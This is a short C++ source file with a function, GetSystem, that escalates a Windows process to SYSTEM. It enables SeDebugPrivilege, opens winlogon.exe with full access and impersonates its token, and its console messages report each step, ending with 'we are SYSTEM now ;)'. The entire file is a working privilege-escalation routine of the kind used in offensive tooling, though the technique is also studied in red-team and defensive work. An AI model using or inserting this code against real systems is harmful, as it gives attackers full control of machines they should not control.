#include "common.h"

bool GetSystem()
{ 
	// let's first make sure we have the SeDebugPrivilege enabled 
	HANDLE tempHandle;
	auto success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
	if (!success)
	{
		Error(GetLastError());
		std::cout << "[-] Failed to open current thread token, exiting...\n";
		return 1;
	}
	RAII::Handle currentToken = tempHandle;

	success = SetPrivilege(currentToken.GetHandle(), L"SeDebugPrivilege", true);
	if (!success) return 1;

	RAII::Handle winlogonHandle = OpenProcess(PROCESS_ALL_ACCESS, false, FindPID(L"winlogon.exe"));
	if (!winlogonHandle.GetHandle())
	{
		std::cout << "[-] Couldn't get a PROCESS_ALL_ACCESS handle to winlogon.exe, exiting...\n";
		return false;
	}
	else std::cout << "[+] Got a PROCESS_ALL_ACCESS handle to winlogon.exe!\n";

	success = OpenProcessToken(winlogonHandle.GetHandle(), TOKEN_QUERY | TOKEN_DUPLICATE, &tempHandle);
	if (!success)
	{
		std::cout << "[-] Couldn't get a handle to winlogon.exe's token, exiting...\n";
		return success;
	}
	else std::cout << "[+] Opened a handle to winlogon.exe's token!\n";
	RAII::Handle tokenHandle = tempHandle;
	
	success = ImpersonateLoggedOnUser(tokenHandle.GetHandle());
	if (!success)
	{
		std::cout << "[-] Couldn't impersonate winlogon.exe's token, exiting...\n";
		return success;
	}
	else std::cout << "[+] Successfully impersonated winlogon.exe's token, we are SYSTEM now ;)\n";
	return success;
}